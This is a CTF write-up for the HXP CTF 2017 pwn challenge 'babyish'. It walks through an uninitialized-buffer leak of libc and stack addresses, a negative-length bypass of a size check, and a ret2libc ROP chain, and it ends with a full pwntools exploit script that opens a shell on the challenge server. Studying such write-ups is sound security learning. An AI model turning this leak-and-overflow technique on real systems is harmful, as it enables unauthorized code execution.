---
title: HXP CTF 2017 - babyish
date: '2017-11-24'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- writeup
- hxp2017
tags:
- pwn
- rop
authors:
- dp_1
---

For this challenge we get a small binary that first asks and prints a name and then reads a string.
Our first vulnerability lies in the `greet` function, where the stack allocated buffer isn't cleared before use.

```cpp
void __cdecl greet(FILE *in, FILE *out)
{
  int v2; // eax
  char buf[64]; // [esp+0h] [ebp-48h]

  printf("Enter username: ");
  v2 = fileno(in);
  read(v2, buf, 64u);
  fprintf(out, "Hey %s", buf);
}
```

Thus when the name is printed back, we get access to some stack variables. In particular, we can leak a libc address and a saved `esp` value.
Having all needed addresses, all that's left to do is overflow the second read by giving it a negative length and rop our way from there.

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[64]; // [esp+0h] [ebp-5Ch]
  int len; // [esp+40h] [ebp-1Ch]
  int *v7; // [esp+50h] [ebp-Ch]

  v7 = &argc;
  setbuf(stdout, 0);
  greet(stdin, stdout);
  sleep(1u);
  printf("Enter length: ");
  len = num();
  if ( len > 63 )
  {
    puts("No!");
    exit(1);
  }
  printf("Enter string (length %u): ", len);
  v3 = fileno(stdin);
  read(v3, buf, len);
  puts("Thanks, bye!");
  return 0;
}
```
There is still one small detail, though: at the end of main the saved value of esp is loaded back from the stack, so we actually have to add this value into our payload to make the application work. This is the relevant assembly at the end of main:
```cpp
.text:080487E2 010                 pop     ecx ; This loads the saved esp value
.text:080487E3 00C                 pop     ebx
.text:080487E4 008                 pop     esi
.text:080487E5 004                 pop     ebp
.text:080487E6 000                 lea     esp, [ecx-4] ; And here it is restored
.text:080487E9 000                 retn
```

Finally, we can call system and get a shell:
`hxp{b4bY's_2nd_pwn4bLe}`

---
Full exploit script:
```python
from pwn import *

#r = process('./vuln')
r = remote('35.198.98.140', 45067)

r.recvuntil(':')
r.sendline('AAAABBBBCCCCDDD')
leak = r.recvuntil('Enter length:')
stack_leak = u32(leak[21:25])
libc_base = u32(leak[25:29]) - 0xCD18
print 'libc base:  ' + hex(libc_base)
print 'stack leak: ' + hex(stack_leak)

rop = ''
rop += p32(libc_base + 0x3A840) # system
rop += p32(0x08048471) # pop; ret
rop += p32(libc_base + 0x15CD48) # "/bin/sh"

r.sendline('-4294967286')
r.sendline('A' * 80 + p32(stack_leak + 0x10) + 'A' * 28 + rop)

r.interactive()
```
